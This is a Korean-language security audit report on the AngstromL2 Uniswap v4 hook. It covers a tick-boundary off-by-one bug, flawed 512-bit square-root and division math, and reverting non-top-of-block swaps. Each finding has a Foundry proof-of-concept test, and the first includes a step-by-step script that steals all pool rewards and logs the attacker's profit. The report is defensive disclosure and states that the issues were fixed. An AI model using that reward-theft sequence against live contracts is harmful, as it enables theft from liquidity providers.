**Lead Auditors**

[Giovanni Di Siena](https://x.com/giovannidisiena)

[100proof](https://x.com/1_00_proof)

**Assisting Auditors**

[Alexzoid](https://x.com/alexzoid_eth) (형식 검증)


---

# 발견 사항 (Findings)
## 높은 위험 (High Risk)


### 현재 틱이 유동성 범위의 상단에서 틱 간격의 정확한 배수일 때 잘못된 활성 유동성 계산으로 인해 모든 보상이 도난당할 수 있음

**설명:** 현재 틱 `t`가 활성 유동성 범위 `[t0, t1)`의 상한에서 틱 간격 `s`의 정확한 배수인 시나리오를 고려하십시오. 여기서 `s = 10`, `t0 = 0`, `t = t1 = 30`입니다. 0-for-1 스왑을 실행하면 `AngstromL2::_zeroForOneDistributeTax` 내에서 `TickIteratorLib::initDown`이 호출되고, 이는 `TickIterator::reset`을 호출하며 최종적으로 `TickIterator::_advanceToNextDown`을 호출합니다:

```solidity
function _advanceToNextDown(TickIteratorDown memory self) private view {
    do {
        (int16 wordPos, uint8 bitPos) =
            TickLib.position((self.currentTick - 1).compress(self.tickSpacing));

        if (bitPos == 255) {
            self.currentWord = self.manager.getPoolBitmapInfo(self.poolId, wordPos);
        }

        bool initialized;
        (initialized, bitPos) = self.currentWord.nextBitPosLte(bitPos);
        self.currentTick = TickLib.toTick(wordPos, bitPos, self.tickSpacing);
        if (initialized) break;
    } while (self.endTick < self.currentTick);
}
```

Uniswap이 활성 유동성이 0이라고 결정하는 범위의 상단 틱에서 유동성이 0이 아닌 초기화된 틱으로 스왑할 때, 틱 교차(tick crossing)의 순 유동성 델타가 활성 유동성을 증가시킬 것으로 예상됩니다. 그러나 위 로직은 현재 틱을 `t1 - s`로 잘못 초기화합니다. 이는 `t1`의 유동성 델타가 무시됨을 의미하며, `CompensationPriceFinder::getZeroForOne` 및 `AngstromL2::_zeroForOneCreditRewards` 모두에서 순 유동성을 감소시킬 때 산술 언더플로가 발생할 수 있습니다:

```solidity
liquidity = liquidity.sub(liquidityNet);
```

이제 `t0' = -50`이고 `t1 = 50`인 두 번째 중첩 유동성 포지션 `[t0', t1')`을 고려하십시오. 동일한 0-for-1 스왑을 실행하면 경계 틱이 건너뛰는 문제가 다시 발생합니다; 그러나 이 시나리오에서는 중첩 포지션에 의해 제공된 충분한 유동성이 있다면 뺄셈이 되돌려지지(revert) 않습니다. 간단히 하기 위해 두 포지션이 동일한 유동성을 제공한다고 가정합니다. 이 경우 `[t0, t1)` 포지션의 유동성은 초기 유동성에서 고려되지 않지만, `t0`가 교차되고 이 범위의 유동성 기여도가 차감될 때 `IUniV4::getTickLiquidity` 호출은 전체 유동성 금액을 반환합니다. 따라서 후속 계산은 `[t0', t0]`에서 활성 상태여야 하는 유동성과 함께 남지만, 이 범위 아래에는 다음 틱이 없으므로 루프가 종료됩니다. 이로 인해 실행이 초과 분배 로직으로 빠지게 되고 전역 누적기(global accumulator)가 업데이트됩니다.

여기서 주의할 점은 주석에는 초과분이 마지막 범위에 분배되어야 한다고 명시되어 있지만, 단순히 `globalGrowthX128`만 증가시키고 다른 것은 하지 않는다는 것입니다(즉, 마지막 포지션에 대해 `rewardGrowthOutsideX128`은 변경되지 않은 상태로 유지됨).

```solidity
// Distribute remainder to last range and update global accumulator.
unchecked {
    cumulativeGrowthX128 += PoolRewardsLib.getGrowthDelta(taxInEther, liquidity);
    rewards[ticks.poolId].globalGrowthX128 += cumulativeGrowthX128;
}
```

이 잘못된 동작이 공격자에 의해 활용되면 모든 보상을 훔치는 것이 가능합니다. 이러한 공격은 특정 우선순위 수수료에 의존하지 않지만, 현재 틱을 경계 틱으로 이동하는 데 필요하다면 블록 최상단 스왑(top-of-block swap)을 획득하기에 충분해야 하며 유동성 추가 시 JIT 세금도 지불해야 합니다. 이러한 주의 사항들이 결합되어 이익을 감소시키겠지만, 다음과 같은 시나리오를 고려할 때 여전히 수익성이 있을 수 있습니다:

* 현재 틱 `t`가 이미 경계 틱 `t1`에 있거나 1-for-0 스왑되어 경계 틱 `t1`에 도달했습니다.
* H-02에 보고된 `rewardGrowthOutsideX128`이 올바르게 초기화되지 않는 문제로 인해, `t0`와 `t1` 모두에 대한 항목이 0이 됩니다.
* 유동성 `L' = L * R / swapTax`가 `[t1 - s, t1)`에 추가됩니다. 여기서 `L`은 `[t0, t1)`의 현재 유동성이고 `R`은 현재 보상 잔액입니다.
* 현재 틱은 공격자 유동성 포지션의 상단 경계 바로 아래 가격, 즉 `t < t1`으로 다시 0-for-1 스왑되어 `token1` 지출을 최소화합니다.
* 틱 경계를 교차할 때 `_updateTickMoveDown()`은 `t1`을 뒤집고(flips) 해당 `rewardsGrowthOutsideX128` 항목을 초기 `rewardGrowthGlobalX128`, `G`로 저장합니다.
* `_zeroForOneCreditRewards()`가 호출될 때 `TickIteratorDown`의 이 버그로 인해 이 틱에 대한 (음수) 순 유동성 차감이 건너뛰어지고, 이는 `[t1 - s, t1)`에 추가된 추가 유동성이 `liquidity`에 추가되지 않고 계산에서 고려되지 않음을 의미합니다.
* 이는 위에 표시된 초과 분배 블록 내에서 계산된 `cumulativeGrowthX128`이 의도한 것보다 작은 `liquidity` 값을 사용하게 함을 의미하며, 이 값은 **유동성 단위당** 보상 성장으로 정의되므로 훨씬 더 큰 성장 델타를 초래하기 때문에 매우 중요합니다.
* `cumulativeGrowthX128` 델타가 `g`라고 가정하면, `swapTax == g * (L + L')`이 아닌 `swapTax == g * L`이 되어 `[t1 - s, t1)` 내부의 보상 성장 계산은 다음과 같습니다:

```solidity
   growthInsideX128
== growthGlobalX128 - rewardsGrowthOutsideX128[T0] - rewardsGrowthOutsideX128[T1]
== (G + g) - 0 - G
== g

    g * L'
== g * L * R / swapTax
== g * L * R / (g * L)
== R
```

* 따라서 공격자가 최종적으로 `[t1 - s, t1)`에서 유동성을 제거할 때 전체 `R` 보상을 받고 이익을 실현합니다.

**영향:** 현재 틱이 유동성 범위의 상단에서 틱 간격의 정확한 배수일 때 활성 유동성이 잘못 계산됩니다. 특정 상황에서는 언더플로로 인해 스왑이 되돌려질(revert) 수 있습니다. 예를 들어 여러 중첩된 유동성 포지션이 있는 경우 보상의 잘못된 분배를 초래할 수 있습니다. 가장 큰 영향을 미치는 경우, 공격자가 이익을 챙기며 모든 보상을 훔칠 수 있습니다.

**개념 증명 (Proof of Concept):**
1. 이 테스트는 `_zeroForOneCreditRewards()`의 [AngstromL2.sol#L364](https://github.com/sorellaLabs/l2-angstrom/blob/386baff9f903aabb48eeb813d3bd629fc740f50a/src/AngstromL2.sol#L364)에서 유동성 언더플로를 유발합니다.

```solidity
function test_cyfrin_swapToBoundaryAddLiqudityAndSwapBackForRevert() public {
    uint256 PRIORITY_FEE = 0.7 gwei;
    int24 INIT_T0 = -50;
    int24 INIT_T1 = 50;
    int24 T0 = 10;
    int24 T1 = 30;

    /* Preconditions */
    assertGt(T0, INIT_T0, "precondition: T0 > INIT_T0");
    assertLt(T1, INIT_T1, "precondition: T1 < INIT_T1");

    PoolKey memory key = initializePool(address(token), 10, 3);
    PoolId id = key.toId();

    angstrom.setPoolLPFee(key, 0.005e6);
    setPriorityFee(PRIORITY_FEE);

    addLiquidity(key, INIT_T0, INIT_T1, 10e21);
    bumpBlock();
    router.swap(key, false, -1000e18, int24(T1).getSqrtPriceAtTick());
    int24 currentTick = manager.getSlot0(id).tick();
    assertEq(currentTick, T1, "precondition: After swap must be sitting on T1");

    addLiquidity(key, T0, T1, 10e21);

    // Now swap back
    bumpBlock();
    router.swap(key, true, -1000e18, int24(INIT_T0 - 1).getSqrtPriceAtTick());
}
```

2. 이 테스트는 `getZeroForOne()`의 [CompensationPriceFinder.sol#L67](https://github.com/sorellaLabs/l2-angstrom/blob/386baff9f903aabb48eeb813d3bd629fc740f50a/src/libraries/CompensationPriceFinder.sol#L67)에서 유동성 언더플로를 유발합니다.

```solidity
function test_cyfrin_swapBackwardsFromTickBoundaryAndRevert() public {
    uint256 PRIORITY_FEE = 0.7 gwei;
    PoolKey memory key = initializePool(address(token), 10, 20);
    angstrom.setPoolLPFee(key, 50000);

    addLiquidity(key, -10, 20, 10e21);
    assertEq(getRewards(key, -10, 20), 0);

    bumpBlock();

    setPriorityFee(PRIORITY_FEE);
    // NOTE: this currently reverts when decrementing liquidity net in CompensationPriceFinder::getZeroForOne
    // because the swap begins at the upper tick of the position (20), where Uniswap determines the liquidity is 0.
    // Then, when crossing the next initialized tick (10), it tries to decrement liquidity net by 10e21 which reverts.
    vm.expectRevert();
    router.swap(key, true, -1000e18, int24(-10).getSqrtPriceAtTick());
}
```

3. 이 테스트는 공격자가 모든 보상을 훔치는 방법을 보여줍니다:

```solidity
struct AttackConfig {
    uint128 INIT_LIQUIDITY;
    uint256 LOOPS_TO_BUILD_UP_REWARDS;
    uint256 PRIORITY_FEE_TO_BUILD_UP_REWARDS;
    uint256 ATTACKER_PRIORITY_FEE;
    int24 INIT_T0;
    int24 INIT_T1;
    int24 START_TICK;
}

function test_cyfrin_stealAllRewards() public {
    AttackConfig memory cfg = AttackConfig({
        INIT_LIQUIDITY: 1e22,
        LOOPS_TO_BUILD_UP_REWARDS: 5,
        PRIORITY_FEE_TO_BUILD_UP_REWARDS: 1000 gwei,
        ATTACKER_PRIORITY_FEE: 5 gwei, // As low as will win TOB because JIT tax must be paid
        INIT_T0: 0,
        INIT_T1: 50,
        START_TICK: 17
    });

    PoolKey memory key = initializePool(address(token), 10, cfg.START_TICK);
    PoolId id = key.toId();

    addLiquidity(key, cfg.INIT_T0, cfg.INIT_T1, cfg.INIT_LIQUIDITY);

    /* Swap back and forth to build up rewards */
    setPriorityFee(cfg.PRIORITY_FEE_TO_BUILD_UP_REWARDS);
    for (uint256 i = 0; i < cfg.LOOPS_TO_BUILD_UP_REWARDS; i++) {
        bumpBlock();
        router.swap(key, true, -10_000e18, int24(cfg.INIT_T0 + 1).getSqrtPriceAtTick());
        bumpBlock();
        router.swap(key, false, -10_000e18, int24(cfg.START_TICK).getSqrtPriceAtTick());
    }

    console2.log("\n\n\n *** ATTACK STARTS ***\n\n\n");

    uint256 rewardsToSteal = angstrom.getPendingPositionRewards(
        key,
        address(router),
        cfg.INIT_T0,
        cfg.INIT_T1,
        bytes32(0));

    uint256 ethBefore = address(router).balance;
    uint256 tokBefore = token.balanceOf(address(router));

    int24 attackTickUpper = (cfg.START_TICK + 10)/10 * 10;
    int24 attackTickLower = attackTickUpper - 10;
    assertLt(attackTickUpper, cfg.INIT_T1, "attackTickUpper >= INIT_T1");
    assertGt(attackTickLower, cfg.INIT_T0, "attackTickLower <= INIT_T0");

    /* Step 1: Attacker moves price to next tick boundary */

    setPriorityFee(0);
    bumpBlock();
    uint256 startPrice = TickMath.getSqrtPriceAtTick(cfg.START_TICK);
    router.swap(key, false, -10_000e18, int24(attackTickUpper).getSqrtPriceAtTick());

    /* Step 2: Attacker swaps zero-to-one back to cfg.START_TICK */

    uint256 swapTax = angstrom.getSwapTaxAmount(cfg.ATTACKER_PRIORITY_FEE);
    uint128 ratio = uint128(rewardsToSteal) * 10_000 / uint128(swapTax);
    uint128 attackLiquidity = cfg.INIT_LIQUIDITY*ratio/10_000;
    console2.log("Calculated ratio as: %s",ratio);

    bumpBlock();
    setPriorityFee(cfg.ATTACKER_PRIORITY_FEE);
    uint256 jitTax = angstrom.getJitTaxAmount(cfg.ATTACKER_PRIORITY_FEE);

    addLiquidity(key, attackTickLower, attackTickUpper, attackLiquidity);
    /* Just swap down to "price at attackTickUpper minus 1" to save on token1 */
    router.swap(key, true, -10e18, (attackTickUpper - 1).getSqrtPriceAtTick());

    (, int256 liqNet) = manager.getTickLiquidity(id, attackTickUpper);
    console2.log("tick liquidity[%s]: %s", vm.toString(attackTickUpper), vm.toString(liqNet));

    // uint256 gr0 = angstrom.testing_getRewardGrowthInsideX128(id, cfg.START_TICK, cfg.INIT_T0, cfg.INIT_T1);
    // console2.log("growthInside[%s,%s]: %s", vm.toString(cfg.INIT_T0), vm.toString(cfg.INIT_T1), gr0);


    // uint256 gr1 = angstrom.testing_getRewardGrowthInsideX128(id, cfg.START_TICK, attackTickLower, attackTickUpper);
    // console2.log("growthInside[%s,%s]: %s", vm.toString(attackTickLower), vm.toString(attackTickUpper), gr1);

    /* Calculate attackRewards before removeLiquidity */
    uint256 attackRewards =
        angstrom.getPendingPositionRewards(
            key,
            address(router),
            attackTickUpper - 10,
            attackTickUpper,
            bytes32(0));


    // Attacker removes the liquidity they added
    router.modifyLiquidity(key, attackTickUpper - 10, attackTickUpper, -int128(attackLiquidity), bytes32(0));


    console2.log("--------------------------------------------------------");
    console2.log("Swap tax:       %s", swapTax);
    console2.log("rewardsToSteal: %s", rewardsToSteal);
    console2.log("Attack rewards: %s", attackRewards);
    console2.log("JIT tax paid:   %s", (jitTax * 2));

    int256 ethDelta = int256(address(router).balance) - int256(ethBefore);
    int256 tokDelta = int256(token.balanceOf(address(router))) - int256(tokBefore);

    /* Price is calculated with respect to START TICK */
    uint256 priceX96 = startPrice;
    uint256 price = priceX96 * priceX96 * 1e18 / 2**192;
    int256 profitInEth = ethDelta + tokDelta * 1e18 / int256(price);

    console2.log("price:          %s", price);

    console2.log("ETH delta:      %s", ethDelta);
    console2.log("TOK delta:      %s", tokDelta);

    console2.log("Profit (ETH):   %s", profitInEth);
}
```

**권장 완화 방법:** 현재 틱이 유동성 경계에 정확히 있을 때, 다른 계산을 수행하기 전에 순 유동성 감소를 먼저 수행하여 이 off-by-one 오류를 해결해야 합니다. `reset()` 내부에서 호출할 때 `[t1, t1+s)`의 유동성이 활용되는 것으로 고려되지 않고 경계 틱을 건너뛰는 것을 방지하기 위해 `currentTick + 1`로 시딩하여 하한을 포함하도록 합니다.

**Sorella Labs:** 커밋 [c01b6c7](https://github.com/SorellaLabs/l2-angstrom/commit/c01b6c7f6649514a5966151e632a45ad46b1ca4b)에서 수정되었습니다.

**Cyfrin:** 확인됨. 경계 틱의 순 유동성이 이제 올바르게 고려되며 공격은 더 이상 수익성이 없습니다.

\clearpage
## 중간 위험 (Medium Risk)


### `Math512Lib::sqrt512` 및 `Math512Lib::div512by256`의 극단적 경우(edge cases)로 인해 유효 가격 계산이 영향을 받을 수 있음

**설명:** `Math512Lib::sqrt512`는 전체 너비 정수 Newton-Raphson 제곱근을 구현합니다. 이는 초기 추측값이 상위 림(limb)보다 크고 256비트 이내에 맞아 반복이 엄격하게 단조 감소(monotonically decreasing)하여 실제 제곱근에 수렴한다는 가정에 의존합니다. 그러나 상위 림의 최상위 비트가 홀수인 경우 2로 내림 나눗셈을 하면 초기 추측값이 상위 림보다 작아져, `floor(([x1 x0]) / root) >= 2^256`의 몫이 너무 넓어질 수 있습니다.

```solidity
function sqrt512(uint256 x1, uint256 x0) internal pure returns (uint256 root) {
    if (x1 == 0) {
        return FixedPointMathLib.sqrt(x0);
    }
    root = 1 << (128 + (LibBit.fls(x1) / 2));
    uint256 last;
    do {
        last = root;
        // `floor(sqrt(UINT512_MAX)) = 2^256-1`이고 추측값이 올바른 결과로 수렴하기 때문에
        // 모든 나눗셈의 결과는 256비트 내에 맞도록 보장됩니다.
        (, root) = div512by256(x1, x0, root);
        root = (root + last) / 2;
    } while (root != last);
    return root;
}
```

`Math512Lib::div512by256`에 의해 반환된 높은 자릿수(high digit)는 의도된 구현 세부 사항에 따라 올바르게 무시되지만, 이는 시연된 바와 같이 위배될 수 있는, 초기 추측값이 256비트 내에 맞다는 가정에 의존합니다.

또한 `Math512Lib::div512by256`의 구현은 장나눗셈(long division)이 적용된 Solady 구현과 동등해야 합니다. 그러나 `r1` 대신 상위 림으로 나머지를 계산할 때 $2^{256}$의 합성이 올바르지 않으므로 그렇지 않습니다:

```solidity
/// @dev `[x1 x0] / d`를 계산합니다.
function div512by256(uint256 x1, uint256 x0, uint256 d)
    internal
    pure
    returns (uint256 y1, uint256 y0)
{
    if (d == 0) revert DivisorZero();
    assembly {
        // 장나눗셈 결과의 첫 번째 "자릿수"를 계산합니다.
        y1 := div(x1, d)
        // 장나눗셈을 계속하기 위해 나머지를 취합니다.
        let r1 := mod(x1, d)
        // `y0 = [r1 x0] / d`를 계산하여 장나눗셈을 완료합니다. Solady의 `fullMulDiv`에서
        // "512 by 256 나눗셈" 로직을 사용합니다 (MIT 라이선스에 따른 크레딧:
        // https://github.com/Vectorized/solady/blob/main/src/utils/FixedPointMathLib.sol)

        // `[r1 x0] mod d = r1 * 2^256 + x0 = (r1 * 2^128) * 2^128 + x0`를 계산해야 합니다.
        let r := addmod(mulmod(shl(128, x1), shl(128, 1), d), x0, d)

        // 설명은 Solady의 `fullMulDiv`를 참조하십시오.
        let t := and(d, sub(0, d))
        d := div(d, t)
        let inv := xor(2, mul(3, d)) // 역원 mod 2**4
        inv := mul(inv, sub(2, mul(d, inv))) // 역원 mod 2**8
        inv := mul(inv, sub(2, mul(d, inv))) // 역원 mod 2**16
        inv := mul(inv, sub(2, mul(d, inv))) // 역원 mod 2**32
        inv := mul(inv, sub(2, mul(d, inv))) // 역원 mod 2**64
        inv := mul(inv, sub(2, mul(d, inv))) // 역원 mod 2**128
        // Solady 대비 수정: `z` 대신 `x0`, `p1` 대신 `r1`, `y0`에 저장된 최종 256비트 결과
        y0 :=
            mul(
                or(mul(sub(r1, gt(r, x0)), add(div(sub(0, t), t), 1)), div(sub(x0, r), t)),
                mul(sub(2, mul(d, inv)), inv) // 역원 mod 2**256
            )
    }
}
```

원하는 계산을 형성하는 대신, 왼쪽 시프트 구성은 모듈로 단계 전에 상위 128비트를 잘라냅니다. 이러한 삭제된 상위 비트의 크기는 `r` 및 그에 따른 `y0`가 빌림(borrow) 단계의 적용에 의해 상향 또는 하향 편향되는지 여부를 결정합니다.

종합하면, 이러한 문제는 유효 가격의 전반적인 계산에 심각한 영향을 미칩니다:

* `CompensationPriceFinder`의 `Math512Lib::div512by256`의 모든 호출은 상위 비트가 0이라고 가정합니다. 이는 `x1 < d`, 즉 `L +/- sqrt(D)`의 상위 비트가 `A = Xhat + x - B`보다 작은 경우에만 유효하여 해가 256비트 내에 맞습니다. 따라서 `L + sqrt(D)`의 상위 128비트는 계산된 보상 가격에 영향을 미치는 데 사용될 수 있습니다. 이는 전적으로 유동성 분배에 의존하므로, 확장하면 하한/상한 틱 가격, 범위 준비금 및 델타 합계에 의존합니다. 그러나 이는 `sqrt(D)`를 계산할 때 제곱근의 잘못된 적용에 의해서도 영향을 받을 수 있다는 점에 유의하십시오.
* `Math512Lib::sqrt512`의 `Math512Lib::div512by256` 호출은 상위 림을 무시하므로, 결과 루트 계산에 영향을 미치는 것은 입력 상위 림의 상위 128비트와 `Math512Lib::sqrt512` 자체의 버그입니다. 마지막 설정 비트가 짝수인 경우 반환된 루트는 실제 루트 주위에서 벗어날 수 있습니다. `Math512Lib::sqrt512` 구현은 실제 루트로 수렴하지만 `Math512Lib::div512by256` 구현은 빌림 단계를 잘못 적용하기 때문입니다. 마지막 설정 비트가 홀수인 경우 반환된 루트는 실제 루트보다 상당히 작을 것이며, 다시 상위 림의 상위 128비트에 따라 양방향으로 벗어날 수 있습니다.
* `CompensationPriceFinder::getZeroForOne` 및 `CompensationPriceFinder::getOneForZero`는 모두 `2**96`과 `simplePstarX96`의 전체 정밀도 곱셈을 전달하며, 이는 최대 353비트를 필요로 합니다(즉, 상위 림의 상위 128비트가 비어 있음). 따라서 이러한 `Math512Lib::sqrt512` 호출은 마지막 설정 비트가 홀수인 경우에만 영향을 받아야 합니다.
* `CompensationPriceFinder::_zeroForOneGetFinalCompensationPrice`에서 분자 `-L + sqrt(D)`는 `D * 2^192`의 마지막 설정 비트가 홀수이면 잘못 계산됩니다. 다시 말하지만, 이는 전적으로 유동성 분배에 의존하며 예상보다 작은 분자를 초래합니다(언더플로가 방지된다고 가정). 그런 다음 실행은 `Math512Lib::div512by256`으로 계속되어 예상보다 낮은 보상 가격을 반환할 수 있습니다. 분자와 결과 보상 가격이 예상보다 클 것이라는 점을 제외하고 음수 `A` 분기에서도 유사합니다.
* `CompensationPriceFinder::_oneForZeroGetFinalCompensationPrice`에서 분자 `L + sqrt(D)`는 위와 유사한 방식으로 잘못 계산되어 분자와 보상 가격이 더 작아집니다.

**영향:** `Math512Lib::sqrt512`는 엄격하게 단조 감소하지 않으며 `Math512Lib::div512by256`은 장나눗셈을 잘못 계산합니다. 이로 인해 유효 가격 계산이 올바르지 않을 수 있습니다.

**개념 증명 (Proof of Concept):** `Math512Lib.t.sol` 파일을 생성하십시오:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import {stdError} from "forge-std/StdError.sol";
import {LibBit} from "solady/src/utils/LibBit.sol";
import {FixedPointMathLib} from "solady/src/utils/FixedPointMathLib.sol";
import {Math512Lib} from "../../src/libraries/Math512Lib.sol";

contract Math512LibHarness {
    using Math512Lib for uint256;

    function fullMul(uint256 x, uint256 y) public pure returns (uint256 z1, uint256 z0) {
        return Math512Lib.fullMul(x, y);
    }

    function sqrt512(uint256 x1, uint256 x0) public pure returns (uint256) {
        return Math512Lib.sqrt512(x1, x0);
    }

    function div512by256(uint256 x1, uint256 x0, uint256 d) public pure returns (uint256 y1, uint256 y0) {
        return Math512Lib.div512by256(x1, x0, d);
    }
}

contract Math512LibTest is Math512LibHarness, Test {
    // 버그: [129, 245]에서 msb가 홀수일 때 몫이 너무 넓음
    function test_oddMsbInitialRootArithmeticError(uint8 msb) public {
        uint256 x0;

        // LibBit.fls(x1)이 홀수 인덱스를 반환하도록 [129, 245]에서 홀수인 msb를 선택
        msb = uint8(129 + 2 * bound(msb, 0, (245 - 129) / 2));

        uint256 x1 = uint256(1) << msb;

        uint256 p = LibBit.fls(x1);
        assertEq(p, msb, "index not equal to msb");
        assertEq(p % 2, 1, "index not odd");

        // p가 홀수일 때 반올림하므로 r0 = 2^(128 + 64) = 2^193이 됨
        uint256 r0 = uint256(1) << (128 + (p / 2));

        // root <= x1이면 floor(([x1 x0]) / root) >= 2^256, 즉 몫이 너무 넓음.
        if (r0 <= x1) console.log("initial root <= x1 when msb is odd -> unsafe: quotient too wide");

        vm.expectRevert(stdError.arithmeticError);
        uint256 root = this.sqrt512(x1, x0);
    }

    // 버그: [247, 255]에서 msb가 홀수일 때 초기 루트 계산 오버플로
    function test_oddMsbInitialRootOverflow(uint8 msb) public {
        uint256 x0;

        // msb가 홀수이고 [247, 255]에 있는지 확인
        msb = uint8(247 + 2 * bound(msb, 0, (255 - 247) / 2));
        uint256 x1 = uint256(1) << msb;

        uint256 r0 = uint256(1) << (128 + (LibBit.fls(x1) / 2));
        if (msb != 255) assertGt(r0, x1, "initial root not > x1");

        vm.expectRevert("DivisorZero()");
        uint256 root = this.sqrt512(x1, x0);
    }

    // 버그: msb가 254(256 미만 최대 짝수)일 때 초기 루트 계산 오버플로
    function test_evenMsbInitialRootOverflow() public {
        uint256 x0;

        uint8 msb = 254; // max even < 256
        uint256 x1 = uint256(1) << msb;

        uint256 r0 = uint256(1) << (128 + (LibBit.fls(x1) / 2));
        assertGt(r0, x1, "initial root not > x1");

        vm.expectRevert(stdError.arithmeticError);
        uint256 root = this.sqrt512(x1, x0);
    }

    // 노트: [0, 254)에서 msb가 짝수일 때 초기 루트 계산은 안전함
    function test_evenMsbInitialRoot(uint8 msb) public {
        uint256 x0;

        vm.assume(msb % 2 == 0 && msb < 254);
        uint256 x1 = uint256(1) << msb;

        uint256 r0 = uint256(1) << (128 + (LibBit.fls(x1) / 2));
        assertGt(r0, x1, "initial root not > x1");

        uint256 root = this.sqrt512(x1, x0);
    }

    // 버그: x1 <= d일 때 몫이 256비트에 맞고 y1은 0이어야 함;
    // 그러나 높은 자릿수가 0이 아닌 경우가 있어 무시해서는 안 됨
    function test_discardHighDigit(uint256 x0, uint256 x1, uint256 d) public {
        // 결과 y1이 0이어야 하는 입력만 허용(즉, 몫이 256비트에 맞음)
        vm.assume(d != 0 && x1 <= d);

        (uint256 y1, ) = this.div512by256(x1, x0, d);

        assertEq(y1, 0, "y1 not zero -> quotient too wide");
    }

    // 버그: x1 <= d일 때 몫이 256비트에 맞고 y1은 0이어야 함;
    // 그러나 y0이 FixedPointMathLib.fullMulDiv(r1, x0, d)로 축소되지 않는 경우가 있음
    function test_fullMulDivEquivalence(uint256 x0, uint256 x1, uint256 d) public {
        // 512비트 곱 계산
        (uint256 p1, uint256 p0) = this.fullMul(x1, x0);

        // 높은 자릿수가 d를 초과하지 않도록 보장; 그렇지 않으면 몫이 256비트에 맞지 않음
        vm.assume(d != 0 && p1 <= d);

        (uint256 y1, uint256 y0) = this.div512by256(p1, p0, d);
        uint256 z = FixedPointMathLib.fullMulDiv(x1, x0, d);

        assertEq(y1, 0, "y1 not zero -> quotient too wide");
        assertEq(y0, z, "y0 not equal to z -> incorrect quotient");
    }
}
```

**권장 완화 방법:** 초기 제곱근 추측값이 항상 상위 림보다 크도록 하여 반복이 단조 감소하도록 하십시오.

다음과 같이 장나눗셈 나머지를 계산하십시오:

```solidity
let r := addmod(addmod(mulmod(r1, not(0), d), r1, d), x0, d)
```

**Sorella Labs:** 커밋 [5a21cf7](https://github.com/SorellaLabs/l2-angstrom/commit/5a21cf770f65fe18573955155ecca0c5b1a815fa)에서 수정되었습니다.

**Cyfrin:** 확인됨. 초기 제곱근 추측값은 이제 항상 올바른 결과 이상에서 시작하며, 상위 비트를 버리지 않고 나눗셈이 계산됩니다.


### 블록 최상단 스왑(top-of-block swap) 이외의 모든 스왑은 되돌려짐(revert)

**설명:** 블록 최상단이 아닌 스왑의 경우 `AngstromL2::afterSwap`이 단락(short-circuits)되지만, `_computeAndCollectProtocolSwapFee()` 호출에서 부채가 잘못 생성된 후 잘못된 `hookDeltaUnspecified`와 함께 실행 후반에 발생합니다. 이는 `_getSwapTaxAmount()`가 블록 최상단 컨텍스트에 종속적이지 않아, 가장 높은 우선순위 수수료가 있는 스왑에서 이미 세금이 부과되었음에도 불구하고 0이 아닌 `taxInEther`가 전달되기 때문에 발생합니다:

```solidity
function afterSwap(
    address,
    PoolKey calldata key,
    SwapParams calldata params,
    BalanceDelta swapDelta,
    bytes calldata
) external override returns (bytes4, int128 hookDeltaUnspecified) {
    _onlyUniV4();

    PoolId id = key.calldataToId();
    uint256 taxInEther = _getSwapTaxAmount();
    hookDeltaUnspecified =
        _computeAndCollectProtocolSwapFee(key, id, params, swapDelta, taxInEther);

    Slot0 slot0BeforeSwap = Slot0.wrap(slot0BeforeSwapStore.get());
    Slot0 slot0AfterSwap = UNI_V4.getSlot0(id);
    rewards[id].updateAfterTickMove(
        id, UNI_V4, slot0BeforeSwap.tick(), slot0AfterSwap.tick(), key.tickSpacing
    );

    uint128 blockNumber = _getBlock();
    if (taxInEther == 0 || blockNumber == _blockOfLastTopOfBlock) {
        return (this.afterSwap.selector, hookDeltaUnspecified);
    }
    _blockOfLastTopOfBlock = blockNumber;

    params.zeroForOne
        ? _zeroForOneDistributeTax(id, key.tickSpacing, slot0BeforeSwap, slot0AfterSwap)
        : _oneForZeroDistributeTax(id, key.tickSpacing, slot0BeforeSwap, slot0AfterSwap);

    return (this.afterSwap.selector, hookDeltaUnspecified);
}
```

이 동작은 다음 속성을 [위반](https://prover.certora.com/output/52567/2ff4b86b481c42c9b70ca9c7b5d08995/?anonymousKey=b11e81aaae9967377cf8f3273d88c841812aa11a)합니다:

```solidity
// Hook must maintain zero balance deltas for all currencies (delta neutral)
invariant hookDeltaNeutrality(env e)
    forall PoolManager.Currency currency.
        ghostCurrencyDeltas[_AngstromL2][currency] == 0
```

**영향:** 단 하나의 블록 최상단 스왑만 실행될 수 있으며 동일한 블록 내의 다른 모든 스왑은 되돌려집니다.

**개념 증명 (Proof of Concept):** 다음 테스트를 `AngstromL2.t.sol`에 추가해야 합니다:

```solidity
function test_cyfrin_multipleSwaps() public {
    setPriorityFee(0.7 gwei);

    PoolKey memory key = initializePool(address(token), 10, 3);
    setupSimpleZeroForOnePositions(key);

    router.swap(key, true, -100e18, int24(-20).getSqrtPriceAtTick());

    setPriorityFee(0.6 gwei);

    vm.expectRevert("CurrencyNotSettled()");
    router.swap(key, true, -100e18, int24(-35).getSqrtPriceAtTick());
}
```

**권장 완화 방법:** 주어진 스왑이 블록 최상단 스왑이 아닌 경우 0 값의 `taxInEther`가 `_computeAndCollectProtocolSwapFee()`에 전달되도록 하십시오:

```diff
function afterSwap(
    address,
    PoolKey calldata key,
    SwapParams calldata params,
    BalanceDelta swapDelta,
    bytes calldata
) external override returns (bytes4, int128 hookDeltaUnspecified) {
        _onlyUniV4();

+       uint128 blockNumber = _getBlock();
        PoolId id = key.calldataToId();
-       uint256 taxInEther = _getSwapTaxAmount();
+       uint256 taxInEther = blockNumber == _blockOfLastTopOfBlock ? 0 : _getSwapTaxAmount();
        hookDeltaUnspecified =
            _computeAndCollectProtocolSwapFee(key, id, params, swapDelta, taxInEther);

@@ -237,7 +238,6 @@ contract AngstromL2 is
            id, UNI_V4, slot0BeforeSwap.tick(), slot0AfterSwap.tick(), key.tickSpacing
        );

-       uint128 blockNumber = _getBlock();
        if (taxInEther == 0 || blockNumber == _blockOfLastTopOfBlock) {
            return (this.afterSwap.selector, hookDeltaUnspecified);
        }
```

이 수정 사항을 적용한 후 속성이 [더 이상 위반되지 않습니다](https://prover.certora.com/output/52567/61528817ccbc4f83a2b6ccac6e12058e/?anonymousKey=f3063485b95f5dc7d548fe11fd26a8e895e04a5b).

**Sorella Labs:** 이 커밋에서 다른 주요 변경 사항이 있었지만 커밋 [ffb9fb2](https://github.com/SorellaLabs/l2-angstrom/commit/ffb9fb20e5b0afbf6996ef9528ef10acd8c94f91)에서 광범위하게 수정되었습니다.

